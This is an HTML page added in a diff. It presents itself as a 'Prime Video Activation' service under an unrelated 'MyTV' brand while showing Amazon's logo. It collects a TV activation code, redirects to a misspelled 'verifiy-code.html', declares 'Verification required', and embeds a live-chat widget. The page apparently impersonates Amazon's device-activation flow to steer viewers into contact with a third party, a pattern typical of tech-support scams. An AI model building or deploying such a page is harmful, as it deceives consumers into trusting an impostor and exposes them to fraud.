@@ -1,0 +1,148 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Prime Video Activation — MyTV</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=Montserrat:wght@600;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#0f1724;
+    --card:#0b1220;
+    --muted:#9aa8c0;
+    --accent:#f59e2e;
+    --accent-2:#ffb85a;
+    --soft: rgba(255,255,255,0.03);
+    --shadow: 0 18px 40px rgba(2,6,23,0.6);
+  }
+  html,body{height:100%;margin:0;font-family:Inter,system-ui,-apple-system,"Segoe UI",Roboto,Arial;background:linear-gradient(180deg,#081122,#0f1724);color:#e6eef8}
+  .wrap{max-width:420px;margin:28px auto;padding:18px}
+  .brand{text-align:center;margin-bottom:4px}
+  .brand img{height:28px;filter:brightness(2)}
+  .title{font-family:Montserrat;font-weight:700;font-size:22px;text-align:center;margin:6px 0}
+  .subtitle{color:var(--muted);text-align:center;font-size:13px;margin-bottom:18px}
+  .card{background:var(--soft);border-radius:14px;padding:18px;box-shadow:var(--shadow);border:1px solid rgba(255,255,255,0.04)}
+  .code-box{padding:18px;border-radius:12px;border:1px solid rgba(255,255,255,0.05);text-align:center}
+  .code-display{width:100%;padding:18px 14px;border-radius:10px;font-size:28px;letter-spacing:6px;font-weight:700;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.04);margin-bottom:10px}
+  .code-input{display:flex;gap:10px}
+  .code-input input{flex:1;padding:14px;border-radius:10px;border:1px solid rgba(255,255,255,0.1);background:transparent;color:#fff}
+  .cta{background:linear-gradient(180deg,var(--accent),var(--accent-2));color:#081022;padding:12px;border-radius:10px;font-weight:800;border:none;cursor:pointer}
+  .steps{display:grid;grid-template-columns:repeat(2,1fr);gap:12px;margin-top:18px}
+  .step{background:rgba(255,255,255,0.03);padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.02)}
+  .step h4{margin:0;font-size:13px}
+  .step p{margin:0;color:var(--muted);font-size:12px}
+  .thumb{height:60px;background:rgba(255,255,255,0.03);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:12px;margin-bottom:6px}
+  .small{text-align:center;color:var(--muted);margin-top:14px;font-size:12px}
+
+.code-input-vertical {
+  width: 100%;
+  padding: 14px 16px;
+  margin-top: 10px;
+  border-radius: 10px;
+  border: 1px solid rgba(255,255,255,0.1);
+  background: transparent;
+  color: #fff;
+  font-size: 16px;
+  outline: none;
+  box-sizing: border-box;
+}
+
+.cta-vertical {
+  width: 100%;
+  margin-top: 12px;
+  padding: 14px;
+  font-size: 16px;
+  border-radius: 10px;
+  font-weight: 800;
+  cursor: pointer;
+  display: block;
+  text-align: center;
+}
+</style>
+</head>
+<body>
+<main class="wrap">
+  <div class="brand">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/1/11/Amazon_Prime_Video_logo.svg">
+  </div>
+  <h1 class="title">Prime Video Activation</h1>
+  <div class="subtitle">Ready to stream? Enter the activation code from your TV</div>
+
+  <section class="card">
+    <div class="code-box">
+      <div id="visualCode" class="code-display">A1B2C3</div>
+      <input id="codeInput" 
+         class="code-input-vertical"
+         name="code" 
+         placeholder="A1B2C3" 
+         inputmode="text" 
+         autocomplete="off" 
+         aria-label="Activation code">
+
+      <button id="activateBtn" class="cta cta-vertical" aria-label="Activate my device">
+        Activate My Device
+      </button>
+    </div>
+
+    <div class="steps">
+      <div class="step"><div class="thumb">1. Open App</div><h4>Open Prime Video</h4><p>On your TV device.</p></div>
+      <div class="step"><div class="thumb">2. Find Code</div><h4>Locate Code</h4><p>Go to Register a device.</p></div>
+      <div class="step"><div class="thumb">3. Enter Code</div><h4>Enter Above</h4><p>Type the alphanumeric code.</p></div>
+      <div class="step"><div class="thumb">4. Confirm</div><h4>Done</h4><p>Your TV will confirm.</p></div>
+    </div>
+    <div class="small">© MyTV — Activation Service</div>
+  </section>
+</main>
+
+<script>
+const input=document.getElementById('codeInput');
+const visual=document.getElementById('visualCode');
+input.addEventListener('input',e=>{
+  const v=e.target.value.trim().toUpperCase();
+  visual.textContent=v||'A1B2C3';
+});
+document.getElementById('activateBtn').addEventListener('click',()=>{
+  const c=input.value.trim();
+  location.href=c?'verifiy-code.html?code='+encodeURIComponent(c):'verifiy-code.html';
+});
+</script>
+
+<!--Start of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/68556f6126a9b719089c1716/1iu6rm62a';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+<!--End of Tawk.to Script-->
+
+
+<script>
+(function(){
+  function getCode(){ try{ var p=new URLSearchParams(window.location.search); return p.get('code') || ''; }catch(e){ return ''; } }
+  var code = getCode().trim();
+  if(!code) return;
+  try{ code = decodeURIComponent(code); }catch(e){}
+  code = code.replace(/[^A-Z0-9\-\s]/ig, '').toUpperCase();
+  var err = document.querySelector('.error-box');
+  if(err){
+    var el = document.createElement('div');
+    el.style.fontWeight='700'; el.style.marginBottom='6px'; el.style.color='#7a0a0a';
+    el.innerHTML = 'Activation code: <strong>'+code+'</strong>';
+    err.insertBefore(el, err.firstChild);
+  } else {
+    var card = document.querySelector('.card') || document.querySelector('main') || document.body;
+    var el2 = document.createElement('div');
+    el2.className='error-box'; el2.style.background='#fdecea'; el2.style.color='#a10000'; el2.style.padding='12px'; el2.style.borderRadius='8px'; el2.style.fontWeight='700'; el2.style.margin='12px 0';
+    el2.innerHTML = 'Activation code: <strong>'+code+'</strong> — Verification required.';
+    card.insertBefore(el2, card.firstChild);
+  }
+})();
+</script>
+</body>
+</html>
